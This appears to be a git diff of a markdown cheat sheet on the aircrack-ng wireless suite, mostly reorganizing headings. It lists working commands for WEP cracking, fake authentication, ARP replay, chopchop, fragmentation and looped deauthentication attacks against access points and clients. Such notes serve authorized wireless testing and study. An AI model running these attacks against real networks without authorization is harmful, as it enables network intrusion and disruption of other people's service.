@@ -1,6 +1,6 @@
 # Always Be Collecting
 
-## Getting started
+## Procedures, Notes, and Tips
 
 Check the wireless interface(s) with iwconfig` and start monitoring mode.
 ```
@@ -26,7 +26,7 @@ Begin collection on target channel, BSSID and recording to file.
 $ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture wlan0mon
 ```
 
-## WEP without clients
+### WEP without clients
 Steps to perform an attack on a WEP access point with no associated clients.
   1) Monitor and capture the target network traffic using `airodump-ng`.
   2) In a new console execute Fake Authentication attack method.
@@ -36,7 +36,7 @@ Steps to perform an attack on a WEP access point with no associated clients.
   6) Inject the arp packet using `aireplay-ng -2`.
   7) Run `aircrack-ng` to obtain the WEP key. 
 
-## aircrack-ng
+### aircrack-ng
 Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
 ```bash
 $ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
@@ -47,7 +47,7 @@ Invoke PTW WEP cracking method method on an arp replay.
 $ aircrack-ng -z replay_arp-0309-015802.cap
 ```
 
-## airmon-ng
+### airmon-ng
 Set interface to monitor mode.
 ```bash
 $ airmon-ng start wlx9cefd5fd1181
@@ -64,20 +64,20 @@ Checking and kill networking services.
 $ airmon-ng check kill
 ```
 
-## aireplay-ng
+### aireplay-ng
 
-### Quick summary
+#### Quick summary
 Attack modes (Numbers can still be used):
 
   - `--deauth`or `-0`
   - `--fakeauth` or `-1`
-  - `--interactive`or 2`
+  - `--interactive`or `2`
   - `--arpreplay` or `-3`
   - `--chopchop` or `-4`
   - `--fragment` or `-5`
   - `--test` or `-9`
 
-### Deauthentication
+#### Deauthentication
 Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
   - `-0` Set for `deauthentication` mode
   - `-e` Target access point ESSID
@@ -87,7 +87,7 @@ Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deaut
 $ aireplay-ng -0 5 -e ap_name -a ap_mac -c client_mac wlan0mon
 ```
 
-### Fake Authentication
+#### Fake Authentication
 Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
   - `-1` Set for fake authentication attack
   - `180` Reassociation timing in seconds
@@ -100,7 +100,7 @@ Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fa
 $ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
 ```
 
-## Interactive packet replay
+#### Interactive packet replay
 Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
   - `-2` Set for interactive packet replay attack mode
   - `-r` ARP file to replay
@@ -108,7 +108,7 @@ Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php
 $ aireplay-ng -2 -r arp-request wlan0mon
 ```
 
-## ARP request replay attack
+#### ARP request replay attack
 Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
   - `-3` Set for ARP request replay attack mode
   - `-x` Number of packets-per-second
@@ -119,7 +119,7 @@ Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php
 $ aireplay-ng -3 -x 100 -r replay.cap -b ap_mac -h our_mac wlan0mon
 ```
 
-## KoreK chopchop attack
+#### KoreK chopchop attack
 Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
   - `-4` Set for chopchop attack
   - `-b` Target access point MAC address
@@ -128,7 +128,7 @@ Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_c
 $  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
 ```
 
-## Fragmentation attack
+#### Fragmentation attack
 Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation).
   - `-5` Set for chopchop attack
   - `-b` Target access point MAC address
@@ -137,7 +137,7 @@ Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragment
 $ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
 ```
 
-## packetforge-ng
+#### packetforge-ng
 Generate packets for injection from PRGA capture.
   - `-0` Set for generate arp packet
   - `-a` Target access point MAC address
@@ -150,13 +150,16 @@ Generate packets for injection from PRGA capture.
 packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
 ``` 
 
-## Loops
+### Quick & Useful
+
+#### Loops
 Loop deauthentication attack to target client.
 ```bash
-for s in `seq 1 1000` ; do for i in $(cat mac); do sleep 1 && aireplay-ng --deauth 1 -e ap_name -a ap_mac -c $i wlan0mon; done; done
+for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c $i wlan0mon; done
 ```
 
-## Renaming interface (temporary)
+
+#### Renaming interface (temporary)
 Rename target interface to `wlan1` instead of systemd generated name.
 ```bash
 $ iwconfig | grep wlx
